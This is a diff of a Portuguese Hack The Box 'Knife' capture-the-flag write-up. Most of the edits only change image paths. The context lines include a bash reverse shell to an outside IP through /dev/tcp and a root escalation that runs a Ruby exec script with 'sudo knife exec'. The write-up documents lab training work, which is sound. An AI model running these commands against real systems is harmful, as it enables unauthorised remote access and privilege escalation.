@@ -6,7 +6,7 @@ categories: [Writeups, Hack The Box - Retired]
 tags: [HTB]
 ---
 
-<img src="/_posts/img/htb-knife-logo.png">
+<img src="/htb/htb-knife-logo.png">
 
 <br>
 
@@ -43,7 +43,7 @@ Encontramos somente as portas 22 e 80 abertas. Vamos começar pela porta 80.
 
 ### Porta 80
 
-<img src="/_posts/img/htb-knife-1.png">
+<img src="/htb/htb-knife-1.png">
 
 Apenas uma página simples sem links para seguir.
 
@@ -136,29 +136,29 @@ $ /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.130/8443 0>&1"
 
 Checando no netcat, conseguimos um shell.
 
-<img src="/_posts/img/htb-knife-2.png">
+<img src="/htb/htb-knife-2.png">
 
 E dentro do diretório do usuário "james", conseguimos flag do usuário.
 
-<img src="/_posts/img/htb-knife-3.png">
+<img src="/htb/htb-knife-3.png">
 <br>
 ## ESCALAÇÃO DE PRIVILÉGIOS
 
 Já dentro do server, vamos fazer a enumeração local, com o comando `sudo -l`, encontramos algo interessante:
 
-<img src="/_posts/img/htb-knife-4.png">
+<img src="/htb/htb-knife-4.png">
 
 O usuário tem permissão de executar `/usr/bin/knife` com privilégios de administrador sem uso de senha, vamos enumerar este binário.
 
-<img src="/_posts/img/htb-knife-5.png">
+<img src="/htb/htb-knife-5.png">
 
 Quando enumeramos o diretório real do binário, podemos ver que se trata de um diretório de instalação do ruby.
 
-<img src="/_posts/img/htb-knife-6.png">
+<img src="/htb/htb-knife-6.png">
 
 Ao tentar executar o programa, ele nos retora uma grande lista de opções de argumento, entre elas uma bem interessante:
 
-<img src="/_posts/img/htb-knife-7.png">
+<img src="/htb/htb-knife-7.png">
 
 Isso significa que podemos executar scripts em ruby, vamos voltar para o diretorio do usuário james e criar um script.
 
@@ -170,12 +170,12 @@ james@knife:~$ echo 'exec "/bin/bash -i"' > hastur.rb
 ```
 Ao executar `sudo /usr/bub/knife exec hastur.rb` temos nosso shell com root e podemos enumerar a flag.
 
-<img src="/_posts/img/htb-knife-8.png">
+<img src="/htb/htb-knife-8.png">
 
 E comprometemos o server!!
 <br>
 
-<img src="/_posts/img/hackerman.gif">
+<img src="/htb/hackerman.gif">
 <br>
 ### Referências
 
